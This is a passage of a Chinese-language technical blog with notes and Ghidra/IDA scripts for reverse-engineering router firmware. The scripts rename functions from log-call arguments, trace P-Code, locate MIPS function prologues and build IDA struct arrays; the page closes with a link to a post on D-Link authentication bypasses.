<h2 id="01-rename-func-by-log-py"><a href="#01-rename-func-by-log-py" class="headerlink" title="01-rename_func_by_log.py"></a>01-rename_func_by_log.py</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rename function name by log,</span></span><br><span class="line"><span class="comment"># tplink-archer-c5-v4-httpd.</span></span><br><span class="line"><span class="comment"># @author lxl</span></span><br><span class="line"><span class="comment"># @category my_script</span></span><br><span class="line"><span class="comment"># @keybinding</span></span><br><span class="line"><span class="comment"># @menupath</span></span><br><span class="line"><span class="comment"># @toolbar</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#TODO Add User Code Here</span></span><br><span class="line">from ghidra.program.model.symbol.SourceType import USER_DEFINED</span><br><span class="line">from tool import get_caller_dict, get_arg_value, get_logger</span><br><span class="line"></span><br><span class="line">debug = True</span><br><span class="line">logger = get_logger(__name__)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    logger.setLevel(10)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="comment"># 1 find func</span></span><br><span class="line">    func_name = <span class="string">"printf"</span></span><br><span class="line">    arg_idx = 2    <span class="comment"># begin from 1</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    target_func = 0</span><br><span class="line">    fm = currentProgram.getFunctionManager()</span><br><span class="line">    funcs = fm.getFunctions(True)</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> funcs:</span><br><span class="line">        <span class="keyword">if</span> func.getName() != func_name:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        target_func = func</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"func: %s , addr: 0x%x , arg_idx: %d"</span> %(func_name, target_func.getEntryPoint().getOffset(), arg_idx))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2 get args</span></span><br><span class="line">    rename_func_dict = &#123;&#125;</span><br><span class="line">    caller_dict = get_caller_dict(target_func)</span><br><span class="line">    <span class="keyword">for</span> caller_addr, caller_info <span class="keyword">in</span> caller_dict.items():</span><br><span class="line">        old_name = caller_info[<span class="string">'caller_func'</span>]</span><br><span class="line">        <span class="keyword">if</span> not old_name.startswith(<span class="string">"FUN_"</span>):</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        arg_list = caller_info[<span class="string">'args'</span>]</span><br><span class="line">        <span class="keyword">if</span> len(arg_list) &lt; arg_idx:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        new_name = get_arg_value(caller_info[<span class="string">'args'</span>], arg_idx)</span><br><span class="line">        <span class="keyword">if</span> new_name is None:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">        logger.debug(<span class="string">"old_name: %s , arg_list: %s"</span> %(old_name, str(arg_list)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        rename_func_dict[old_name] = &#123;</span><br><span class="line">            <span class="string">"new_name"</span>: new_name,</span><br><span class="line">            <span class="string">"caller_addr"</span>: caller_addr</span><br><span class="line">        &#125;</span><br><span class="line">        logger.debug(<span class="string">"new_name: %s , caller_addr: 0x%x"</span> %(old_name, caller_addr.getOffset()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3 rename</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"rename %d functions by %s"</span> % (len(rename_func_dict), func_name))</span><br><span class="line">    <span class="keyword">for</span> old_name, rename_info <span class="keyword">in</span> rename_func_dict.items():</span><br><span class="line">        new_name = rename_info[<span class="string">'new_name'</span>]</span><br><span class="line">        caller_addr = rename_info[<span class="string">'caller_addr'</span>]</span><br><span class="line">        <span class="comment"># getFunction(old_name).setName(new_name, USER_DEFINED)#here</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\t&#123;:#x&#125; in &#123;:20s&#125;  new_name: &#123;&#125;"</span>.format(caller_addr.getOffset(), old_name, new_name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="02-get-func-caller-py"><a href="#02-get-func-caller-py" class="headerlink" title="02-get_func_caller.py"></a>02-get_func_caller.py</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get function caller using P-Code.</span></span><br><span class="line"><span class="comment"># tplink-archer-c5-v4-httpd.</span></span><br><span class="line"><span class="comment"># @author lxl</span></span><br><span class="line"><span class="comment"># @category my_python_script</span></span><br><span class="line"><span class="comment"># @keybinding</span></span><br><span class="line"><span class="comment"># @menupath</span></span><br><span class="line"><span class="comment"># @toolbar</span></span><br><span class="line"></span><br><span class="line">from tool import get_caller_dict, get_arg_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 1 find func</span></span><br><span class="line">    <span class="comment"># target_func_name = askLong("input", "function name")</span></span><br><span class="line">    target_func_name = <span class="string">"cdbg_printf"</span></span><br><span class="line">    target_func = 0</span><br><span class="line">    fm = currentProgram.getFunctionManager()</span><br><span class="line">    funcs = fm.getFunctions(True)</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> funcs:</span><br><span class="line">        <span class="keyword">if</span> func.getName() != target_func_name:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        target_func = func</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n1: find %s at 0x%s"</span> % (target_func_name, target_func.getEntryPoint()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2 get args</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"2: get args"</span>)</span><br><span class="line">    caller_dict = get_caller_dict(target_func)</span><br><span class="line">    caller_index = 0</span><br><span class="line">    <span class="keyword">for</span> caller_addr, caller_info <span class="keyword">in</span> caller_dict.items():</span><br><span class="line">        args_str = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(caller_info[<span class="string">'args'</span>])):</span><br><span class="line">            arg_value = get_arg_value(caller_info[<span class="string">'args'</span>], i + 1)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(arg_value) == long:</span><br><span class="line">                arg_value = hex(arg_value)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">type</span>(arg_value) == str:</span><br><span class="line">                arg_value = repr(arg_value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                arg_value = <span class="string">"Unknown"</span></span><br><span class="line">            args_str += <span class="string">"%s, "</span> % arg_value</span><br><span class="line"></span><br><span class="line">        <span class="comment"># only xxx</span></span><br><span class="line">        <span class="comment"># if "%s" not in args_str:</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line"></span><br><span class="line">        caller_index += 1</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\t&#123;:3d&#125;: &#123;:#x&#125; in &#123;:20s&#125;\t&#123;&#125;(&#123;&#125;)"</span>.format(caller_index, caller_addr.offset, caller_info[<span class="string">'caller_func'</span>], target_func_name, args_str.strip(<span class="string">", "</span>)))</span><br></pre></td></tr></table></figure>
<h2 id="03-trace-func-java"><a href="#03-trace-func-java" class="headerlink" title="03-trace_func.java"></a>03-trace_func.java</h2><ul>
<li>见文件</li>
</ul>
<h2 id="04-其它"><a href="#04-其它" class="headerlink" title="04-其它"></a>04-其它</h2><ul>
<li>window-python，python命令行窗口，光标放在反编译窗口C语句上（必须放在C语句上）</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反汇编</span></span><br><span class="line">0040bd74     jalr       t9=&gt;cdbg_printf                                  undefined cdbg_printf()</span><br><span class="line"><span class="comment"># 反编译</span></span><br><span class="line">cdbg_printf(8,<span class="string">"http_rpm_confburn"</span>,0xf6,<span class="string">"Detach big buffer error\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp<span class="comment"># 获取pcode</span></span><br><span class="line"> ---  CALL (ram, 0x4187a0, 8) , (const, 0x8, 4) , (unique, 0x1000001e, 4) , (const, 0xf6, 4) , (unique, 0x1000001a, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(2)<span class="comment"># getInput函数可以方便的获取P-Code的input参数</span></span><br><span class="line">(unique, 0x1000001e, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(2).getDef()<span class="comment"># 通过调用VarNode的getDef函数来对该VarNode的赋值流进行追踪</span></span><br><span class="line">(unique, 0x1000001e, 4) COPY (const, 0x41c564, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(2).PCAddress<span class="comment"># PCAddress表示当前pcode对应的反汇编中指令地址</span></span><br><span class="line">0040bd74</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(2).getPCAddress()<span class="comment"># PCAddress等价getPCAddress()，最好函数形式</span></span><br><span class="line">0040bd74</span><br></pre></td></tr></table></figure>
<ul>
<li>同一个函数内，可能会有多个log输出函数，故不好确定函数名</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void FUN_0041573c(char **param_1)</span><br><span class="line">&#123;</span><br><span class="line">    cdbg_printf(8,<span class="string">"findDynDomainName"</span>,0x3fe,<span class="string">"Falied to get DYN_DNS_CFG_OBJ"</span>);</span><br><span class="line">		cdbg_printf(8,<span class="string">"findWanIp"</span>,uVar4,pcVar5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>取字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># "isValidIp"位于0041a0a0</span></span><br><span class="line">0041a09a     ds         <span class="string">"\r\r\r\r\r\risValidIp"</span></span><br><span class="line">cdbg_printf(8,<span class="string">"isValidIp"</span>,uVar2,<span class="string">"Error ocurrs in convertint the IPs to num format!"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 跳过偏移则无结果</span></span><br><span class="line">&gt;&gt;&gt; getDataAt(toAddr(0x41a09a))<span class="comment"># 有结果</span></span><br><span class="line">ds <span class="string">"\r\r\r\r\r\risValidIp"</span></span><br><span class="line">&gt;&gt;&gt; getDataAt(toAddr(0x41a0a0))<span class="comment"># 空</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因此取字符串时，多加一个or</span></span><br><span class="line"><span class="keyword">if</span> getDataAt(arg_addr) or chr(currentProgram.getMemory().getByte(arg_addr)):</span><br><span class="line">    arg_value = get_string_by_addr(arg_addr)</span><br></pre></td></tr></table></figure>
<ul>
<li>输出的函数名/地址，两侧要有空格，才能点击跳转</li>
<li>import tool：</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tool中需导入__main__</span></span><br><span class="line"><span class="comment"># from __main__ import *</span></span><br><span class="line">The Python module that Ghidra directly launches is always called __main__.  If we import</span><br><span class="line">everything from that module, this module will behave as <span class="keyword">if</span> Ghidra directly launched it.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 否则报错</span></span><br><span class="line">NameError: global name <span class="string">'getReferencesTo'</span> is not defined</span><br><span class="line"></span><br><span class="line"><span class="comment"># 都放在一个主文件中不需要，只有在import tool时，tool中需要导入</span></span><br></pre></td></tr></table></figure>
<ul>
<li>地址与地址对象的转换：addr_obj = toAddr(addr), addr = addr_obj.offset</li>
<li>获取pcode所在地址</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#         </span></span><br><span class="line">004a4860     jalr       t9=&gt;util_execSystem</span><br><span class="line">util_execSystem(<span class="string">"setRule"</span>,acStack568);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(0).PCAddress</span><br><span class="line">004a4860</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2（</span></span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getSeqnum().getTarget()</span><br><span class="line">004a4860</span><br></pre></td></tr></table></figure>
<ul>
<li>遍历函数内pcode时</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二者同效果，monitor是啥？</span></span><br><span class="line"><span class="keyword">while</span> ops.hasNext() and ~monitor.isCancelled():</span><br><span class="line"><span class="keyword">while</span> ops.hasNext():</span><br></pre></td></tr></table></figure>
<ul>
<li>pcode获取，python代码与其它二者不同</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 地址004a4860</span></span><br><span class="line">004a4860     jalr       t9=&gt;util_execSystem</span><br><span class="line">util_execSystem(<span class="string">"setRule"</span>,acStack568);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行</span></span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp</span><br><span class="line"> ---  CALL (ram, 0x4835d0, 8) , (unique, 0x10000085, 4) , (register, 0x14, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getSeqnum().getTarget()</span><br><span class="line">004a4860</span><br><span class="line"></span><br><span class="line"><span class="comment"># java代码</span></span><br><span class="line">Call @ 0x4a4860 [oal_fw6_delRule] to 0x4835d0 [util_execSystem] (3 pcodeops)</span><br><span class="line">	 ---  CALL (ram, 0x4835d0, 8) , (unique, 0x10000085, 4) , (register, 0x14, 4) </span><br><span class="line">	Parameter <span class="comment">#0 - (ram, 0x4835d0, 8) @ 0x4835d0</span></span><br><span class="line">	Parameter <span class="comment">#1 - (unique, 0x10000085, 4) @ 0x10000085</span></span><br><span class="line">	Parameter <span class="comment">#2 - (register, 0x14, 4) @ 0x14</span></span><br><span class="line">	</span><br><span class="line"><span class="comment"># python代码    </span></span><br><span class="line">Debug 3:  ---  CALLIND (register, 0x64, 4) , (register, 0x10, 4) , (register, 0x14, 4)</span><br><span class="line">Debug 4: 004a4860</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原因：要对dec_lib进行设置，不可默认</span></span><br><span class="line">旧：dec_lib = DecompInterface()</span><br><span class="line">新：dec_lib = setup_decompiler(currentProgram)</span><br><span class="line">def setup_decompiler(program):</span><br><span class="line">    decomp_interface = DecompInterface()</span><br><span class="line">    options = DecompileOptions()</span><br><span class="line">    tool = state.getTool()</span><br><span class="line">    <span class="keyword">if</span> tool:</span><br><span class="line">        service = tool.getService(OptionsService)</span><br><span class="line">        <span class="keyword">if</span> service:</span><br><span class="line">            opt = service.getOptions(<span class="string">"Decompiler"</span>)</span><br><span class="line">            options.grabFromToolAndProgram(None, opt, program)</span><br><span class="line"></span><br><span class="line">    decomp_interface.setOptions(options)</span><br><span class="line">    decomp_interface.toggleCCode(True)</span><br><span class="line">    decomp_interface.toggleSyntaxTree(True)</span><br><span class="line">    decomp_interface.setSimplificationStyle(<span class="string">"decompile"</span>)</span><br><span class="line">    <span class="built_in">return</span> decomp_interface</span><br><span class="line"><span class="comment"># 新结果</span></span><br><span class="line">Debug 3:  ---  CALL (ram, 0x4835d0, 8) , (unique, 0x10000085, 4) , (register, 0x14, 4)</span><br><span class="line">Debug 4: 004a4860</span><br></pre></td></tr></table></figure>
<ul>
<li>导入<ul>
<li>java：import ghidra.app.decompiler.DecompInterface;</li>
<li>python：from ghidra.app.decompiler import DecompInterface</li>
</ul>
</li>
<li>varnode：const</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0)</span><br><span class="line">(const, 0x4c1460, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0).isConstant()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0).getAddress()<span class="comment"># 16进制</span></span><br><span class="line">const:004c1460</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0).getOffset()<span class="comment"># 10进制</span></span><br><span class="line">4985952L</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0).getDef()<span class="comment"># 常数，没法再向上追溯定义</span></span><br></pre></td></tr></table></figure>
<ul>
<li>todo<ul>
<li>get_func_pcode只保存调用目标函数的（python版）</li>
<li>怎么区分数值8与字符串地址//here</li>
</ul>
</li>
</ul>
<h1 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h1><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><ul>
<li>官网：<a href="https://hex-rays.com/products/ida/support/idadoc/162.shtml" target="_blank" rel="noopener">https://hex-rays.com/products/ida/support/idadoc/162.shtml</a></li>
<li><p>文件：ida_dir/idc/idc.idc</p>
<h2 id="create-function-py"><a href="#create-function-py" class="headerlink" title="create_function.py"></a>create_function.py</h2></li>
<li><p>from：笔记12-Reverse Engineering VxWorks Firmware: WRT54Gv8</p>
</li>
<li>原理：找函数序言<ul>
<li>遍历代码，查找函数序言来定位未标识的函数，如果找到一个，告诉IDA在那里创建一个函数</li>
<li>MIPS比Intel要复杂一些，因为函数序言在MIPS中没有那么标准化</li>
<li>在代码（从光标位置开始）中搜索与这些指令（函数序言）对应的字节序列，并指示IDA将它们转换为函数。</li>
</ul>
</li>
<li><p>常见序言：见note-汇编指令-mips-函数序言</p>
</li>
<li><p>起始地址/停止地址</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 起始地址：光标位置开始</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在反汇编中，包含字符串的数据部分似乎从0x802DDAC0开始，因此将其设为停止地址</span></span><br><span class="line">ROM:802DDAB4  <span class="comment"># End of function sub_802DDA64</span></span><br><span class="line">ROM:802DDAB4  <span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line">ROM:802DDAB8                 .word 0</span><br><span class="line">ROM:802DDABC                 .word 0</span><br><span class="line">ROM:802DDAC0 aInvalidConfigu:.ascii <span class="string">"Invalid configuration. PCI_MAX_DEV &gt; 16, PCI mechanism #2\n"</span>&lt;0&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者直接拉到最后，找最后的地址</span></span><br><span class="line">ROM:80383A5E                 .byte    0</span><br><span class="line">ROM:80383A5F                 .byte    0</span><br><span class="line">ROM:80383A5F</span><br><span class="line">ROM:80383A5F                  <span class="comment"># end</span></span><br></pre></td></tr></table></figure>
<h2 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如何将一堆数据转为有意义的结构体数组：创建结构体、选择结构体、转为array</span></span><br><span class="line"><span class="comment"># 1 创建结构体</span></span><br><span class="line">00000000 struc_label     struc ; (sizeof=0xC, mappedto_50)</span><br><span class="line">00000000                                         ; XREF: .data:label_tab/r</span><br><span class="line">00000000 index           DCD ?                   ; XREF: sa_parseRcvCmd+150/r</span><br><span class="line">00000004 string          DCD ?                   ; XREF: sa_parseRcvCmd+80/r</span><br><span class="line">00000004                                         ; sa_parseRcvCmd+330/r ; offset (00000000)</span><br><span class="line">00000008 <span class="built_in">type</span>            DCD ?                   ; XREF: sa_parseRcvCmd+88/r</span><br><span class="line">00000008                                         ; sa_parseRcvCmd+338/r</span><br><span class="line">0000000C struc_label     ends</span><br><span class="line"><span class="comment"># 2 结构体数组开始处，即第一个结构体处，alt+q：choose a structure type</span></span><br><span class="line"><span class="comment"># 3 同样开始处，shift+*或右键array，输入array size（大小自己控制</span></span><br><span class="line"><span class="comment"># 4 数组大小自己控制，比如400后，后续一些数据明显不对，有203行错误，故修正为197行</span></span><br><span class="line"><span class="comment"># 5 修正后（注意，地址都变成了数组首地址</span></span><br><span class="line">.data:0007DA44 label_tab       struc_label &lt;0xFF00, aNewenable, 1&gt;</span><br><span class="line">.data:0007DA44                                         ; DATA XREF: sub_1156C+30↑o</span><br><span class="line">.data:0007DA44                                         ; sub_1156C+68↑o ...</span><br><span class="line">.data:0007DA44                 struc_label &lt;0xFF01, aNewconnectiont, 0x10&gt; ; <span class="string">"NewNTPServer1"</span> ...</span><br><span class="line">.data:0007DA44                 struc_label &lt;0xFF02, aNewisploginnam, 0x40&gt;</span><br><span class="line">.data:0007DA44                 struc_label &lt;0xFF03, aNewisppassword, 0x40&gt;</span><br><span class="line">.data:0007DA44                 struc_label &lt;0xFF04, aNewidletimer, 3&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 为何会显示这样？怎么显示字符串和函数名</span></span><br><span class="line">.data.rel.ro:004584C8 cgi_tbl:        my_struct1 &lt;0x444148, 0x422C40, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                                          <span class="comment"># DATA XREF: LOAD:00400FEC↑o</span></span><br><span class="line">.data.rel.ro:004584C8                                          <span class="comment"># init_global+268↑o ...</span></span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x43FE94, 0x4188E0, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x444154, 0x423DB8, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x444160, 0x423B80, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x44416C, 0x425120, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x44417C, 0x4270DC, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x444190, 0x424A24, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441A4, 0x429548, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441B8, 0x41983C, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441CC, 0x42A0FC, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441E4, 0x423438, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441F0, 0x4231AC, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1  &lt;0&gt;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/07/13/iot/D-Link两个认证绕过漏洞的分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/13/iot/D-Link两个认证绕过漏洞的分析/" class="post-title-link" itemprop="url">D-Link两个认证绕过漏洞的分析</a>
